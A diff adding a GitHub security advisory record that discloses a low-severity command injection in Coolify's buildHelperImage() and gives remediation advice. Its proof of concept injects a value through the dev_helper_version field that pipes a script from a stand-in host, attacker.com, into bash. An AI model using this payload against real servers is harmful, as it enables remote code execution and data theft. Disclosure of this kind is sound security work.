@@ -1,0 +1,50 @@
+{
+  "global": null,
+  "id": "GHSA-x9qh-w4c4-54f9",
+  "repo": {
+    "cve_id": "CVE-2026-42148",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 3.8,
+        "vector_string": "CVSS:3.1/AV:L/AC:H/PR:H/UI:R/S:U/C:L/I:L/A:L"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-78"
+    ],
+    "description": "\r\n### Summary\r\n\r\nThe `buildHelperImage()` method in `app/Livewire/Settings/Index.php` constructs a Docker build command using user-controlled input (`$this->dev_helper_version`) without shell escaping. An attacker who can set the `dev_helper_version` field can inject arbitrary shell commands that execute on the server when the helper image build is triggered.\r\n\r\n### Details\r\n\r\nIn `app/Livewire/Settings/Index.php:172-209`:\r\n```php\r\npublic function buildHelperImage()\r\n{\r\n    try {\r\n        if (! isDev()) {\r\n            $this->dispatch('error', 'Building helper image is only available in development mode.');\r\n            return;\r\n        }\r\n        // ...\r\n        $version = $this->dev_helper_version ?: config('constants.coolify.helper_version');\r\n        // ...\r\n        $buildCommand = \"docker build -t ghcr.io/coollabsio/coolify-helper:{$version} -f docker/coolify-helper/Dockerfile .\";\r\n\r\n        $activity = remote_process(\r\n            command: [$buildCommand],\r\n            server: $this->server,\r\n            type: 'build-helper-image'\r\n        );\r\n```\r\n\r\nThe `$version` variable comes from `$this->dev_helper_version` which is a Livewire property set by user input. It is validated only as `nullable|string|max:50` (line 38-39) but NOT escaped for shell metacharacters. The `$buildCommand` string is then passed to `remote_process()` which executes it on the server via SSH.\r\n\r\nWhile there is an `isDev()` check, this function returns `true` in development environments, and the `dev_helper_version` field is stored in the database and can be set through the settings interface.\r\n\r\n### PoC\r\n\r\n1. Access the instance settings page as an authenticated user\r\n2. Set `dev_helper_version` to:\r\n```\r\nlatest -f /dev/null; curl http://attacker.com/shell.sh | bash; echo \"\r\n```\r\n3. Click \"Build Helper Image\"\r\n4. The resulting command becomes:\r\n```bash\r\ndocker build -t ghcr.io/coollabsio/coolify-helper:latest -f /dev/null; curl http://attacker.com/shell.sh | bash; echo \" -f docker/coolify-helper/Dockerfile .\r\n```\r\n5. The injected command executes on the server\r\n\r\n### Impact\r\n\r\nAn attacker can:\r\n- Execute arbitrary commands on the server\r\n- Gain reverse shell access\r\n- Exfiltrate sensitive data (environment variables, database credentials)\r\n- Pivot to other systems in the network\r\n\r\n### Remediation\r\n\r\n1. Use `escapeshellarg($version)` when interpolating into the shell command:\r\n```php\r\n$buildCommand = \"docker build -t ghcr.io/coollabsio/coolify-helper:\".escapeshellarg($version).\" -f docker/coolify-helper/Dockerfile .\";\r\n```\r\n2. Validate `$version` against a strict regex pattern (e.g., `/^[a-zA-Z0-9._-]+$/`)\r\n3. Consider removing the `dev_helper_version` field from production builds entirely\r\n",
+    "ghsa_id": "GHSA-x9qh-w4c4-54f9",
+    "html_url": "https://github.com/coollabsio/coolify/security/advisories/GHSA-x9qh-w4c4-54f9",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-x9qh-w4c4-54f9"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-42148"
+      }
+    ],
+    "published_at": "2026-07-02T16:36:42Z",
+    "references": [],
+    "severity": "low",
+    "summary": "Command Injection via Unescaped Version String in Docker Build",
+    "updated_at": "2026-07-02T16:36:42Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "composer",
+          "name": "coollabsio/coolify"
+        },
+        "patched_versions": "4.0.0-beta.474",
+        "vulnerable_version_range": "<= 4.0.0-beta.473"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "coollabsio/coolify"
+}
